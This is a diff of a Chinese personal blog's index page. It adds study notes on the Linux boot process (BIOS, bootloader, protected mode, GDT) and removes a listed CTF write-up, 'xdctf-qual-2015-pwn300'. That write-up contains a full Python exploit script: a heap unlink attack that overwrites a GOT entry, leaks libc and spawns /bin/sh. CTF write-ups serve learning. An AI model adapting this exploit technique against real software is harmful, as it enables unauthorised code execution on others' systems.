@@ -298,6 +298,157 @@
             
               
                 
+                <a class="post-title-link" href="/2016/09/03/linux-inside/" itemprop="url">
+                  Linux Insides 笔记1
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-03T00:00:00+08:00" content="2016-09-03">
+              2016-09-03
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/书/" itemprop="url" rel="index">
+                    <span itemprop="name">书</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/03/linux-inside/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/03/linux-inside/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>[TOC]</p>
+<h1 id="Booting">Booting</h1><h2 id="From_bootloader_to_kernel">From bootloader to kernel</h2><h3 id="0x00_加电启动">0x00 加电启动</h3><p>加电后，CPU启动，运行在实模式下，并对寄存器初始化，跳转至<strong><em>Reset Vector</em></strong>，然后跳转至<strong><em>BIOS</em></strong></p>
+<h3 id="0x01_BIOS">0x01 BIOS</h3><p><strong><em>BIOS</em></strong>首先查看<strong><em>BIOS Configure</em></strong>，来确定<em>boot</em>的顺序</p>
+<p>当要从一个硬盘（也可以是networks, optical media, USB based devices）<strong><em>boot</em></strong>时，<strong><em>BIOS</em></strong>首先会寻找<strong><em>boot sector</em></strong>，在<strong><em>MBR</em></strong>分区的硬盘上，<strong><em>boot sector</em></strong>存放在第一个扇区(共512字节)的前446个字节，然后开始执行</p>
+<p>执行完<strong><em>boot sector code</em></strong>之后，<strong><em>BIOS</em></strong>会选择一个<strong><em>Bootloader</em></strong>，并将程序控制权交给它</p>
+<p>Note: <strong><em>BIOS</em></strong>在<strong><em>ROM</em></strong>里</p>
+<h3 id="0x03_Bootloader">0x03 Bootloader</h3><p><strong><em>Bootloader</em></strong>是用来load system，和其他一些系统程序的，典型的有<strong><em>GRUB 2</em></strong>和<strong><em>syslinux</em></strong></p>
+<p><strong><em>Bootloader</em></strong>会把<strong><em>Kernel</em></strong>load到内存里，然后开始执行<strong><em>kernel setup code</em></strong>(这个代码在kernel源码中<a href="https://github.com/torvalds/linux/blob/master/arch/x86/boot/header.S" target="_blank" rel="external">/arch/x86/boot/header.S</a>中可以找到)</p>
+<h3 id="0x04_Kernel">0x04 Kernel</h3><p>进入<strong><em>kernel setup code</em></strong>后</p>
+<p>它主要做了以下的工作</p>
+<ol>
+<li>确认所有段寄存器的值是一样的</li>
+<li>建立<em>栈</em></li>
+<li>建立<em>bss</em></li>
+<li>转入C代码的<em>main function</em> (<a href="https://github.com/torvalds/linux/blob/master/arch/x86/boot/main.c#L135" target="_blank" rel="external">arch/x86/boot/main.c</a>)</li>
+</ol>
+<h2 id="First_steps_in_the_kernel_setup">First steps in the kernel setup</h2><p>prepare to move to <strong><em>proctected mode</em></strong></p>
+<h3 id="0x01_Protected_mode（保护模式）">0x01 Protected mode（保护模式）</h3><p><strong><em>Protected mode</em></strong>拥有更大的内存空间，并且适用于多进程的环境(防止进程间对彼此内存区域互相干扰)</p>
+<h4 id="segmentation（内存分段）">segmentation（内存分段）</h4><p>每个<em>segment</em>（分段）的<em>segment descriptor（段描述符）</em>存放在<em>Global descriptor table (GDT)</em>中，这个表的地址存放在<em>GDTR寄存器</em>中</p>
+<p>在保护模式下寻找物理地址，首先要根据对应的段寄存器的index值来从GDT中找到对应的段描述符，段描述符中的base值即为基址，然后在根据该虚拟地址在该段终端偏移，两者相加即可得到线性地址，对于线性地址转换为实际物理地址，与分页机制有关，是后面的内容</p>
+<h3 id="0x02_ohter">0x02 ohter</h3><ol>
+<li>Copying boot parameters into the “zeropage”</li>
+<li>Console initialization</li>
+<li>Heap initialization</li>
+<li>CPU validation</li>
+<li>Memory detection</li>
+<li>Keyboard initialization</li>
+<li>Querying</li>
+</ol>
+<p>这些过程均在<a href="https://github.com/torvalds/linux/blob/master/arch/x86/boot/main.c#L135" target="_blank" rel="external">/arch/x86/boot/main.c</a>中可以找到</p>
+<h3 id="0x03_FAQ">0x03 FAQ</h3><p>Q: BIOS和kernel的区别是什么？<br>A: <a href="https://www.quora.com/What-is-the-difference-between-BIOS-and-kernel" target="_blank" rel="external">https://www.quora.com/What-is-the-difference-between-BIOS-and-kernel</a></p>
+<h1 id="Source">Source</h1><p><a href="https://www.gitbook.com/book/0xax/linux-insides/details" target="_blank" rel="external">Linux Inside</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/09/02/ssctf-qual-2016-pwn1/" itemprop="url">
                   ssctf-qual-2016-pwn1
                 </a>
@@ -826,135 +977,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn300/" itemprop="url">
-                  xdctf-qual-2015-pwn300
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
-              2016-08-17
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/17/xdctf-qual-2015-pwn300/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/17/xdctf-qual-2015-pwn300/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>题目是自己写的malloc和free，最简单的<code>unlink</code>漏洞</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./aa508d1df74d46a88bc02210c7f92824'</span></span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_girl</span><span class="params">(typ)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the type of the Girl:'</span>)</span><br><span class="line">    io.writeline(str(typ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_girl</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girl id to delete:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_girl</span><span class="params">(idx, typ, girl)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girl id to edit:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'Give the type to edit:'</span>)</span><br><span class="line">    io.writeline(str(typ))</span><br><span class="line">    io.read_until(<span class="string">'Give your Girl:'</span>)</span><br><span class="line">    io.writeline(girl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_girl</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Give the Girlid to print:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line">got_puts    = <span class="number">0x804b014</span></span><br><span class="line">adr_buf     = <span class="number">0x804b060</span></span><br><span class="line"></span><br><span class="line">add_girl(<span class="number">1</span>)</span><br><span class="line">add_girl(<span class="number">2</span>)</span><br><span class="line">add_girl(<span class="number">1</span>)</span><br><span class="line">edit_girl(<span class="number">0</span>, <span class="number">2</span>, <span class="string">'A'</span> * (<span class="number">0xe0</span> - <span class="number">0xc</span>) + l32(adr_buf - <span class="number">8</span>) + l32(got_puts))</span><br><span class="line">edit_girl(<span class="number">2</span>, <span class="number">1</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_girl(<span class="number">1</span>)</span><br><span class="line">show_girl(<span class="number">0</span>)</span><br><span class="line">adr_puts = l32(io.read(<span class="number">5</span>)[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">off_puts    = <span class="number">0x00065650</span></span><br><span class="line">off_system  = <span class="number">0x00040190</span></span><br><span class="line">adr_libc    = adr_puts - off_puts</span><br><span class="line">adr_system  = adr_libc + off_system</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base : &#123;&#125;'</span>.format(hex(adr_libc))</span><br><span class="line"></span><br><span class="line">edit_girl(<span class="number">0</span>, <span class="number">1</span>, l32(adr_system))</span><br><span class="line"></span><br><span class="line">io.writeline(<span class="string">'4'</span>)</span><br><span class="line">io.writeline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -995,7 +1022,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">25</span>
+              <span class="site-state-item-count">26</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1003,7 +1030,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">4</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1012,7 +1039,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-count">31</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
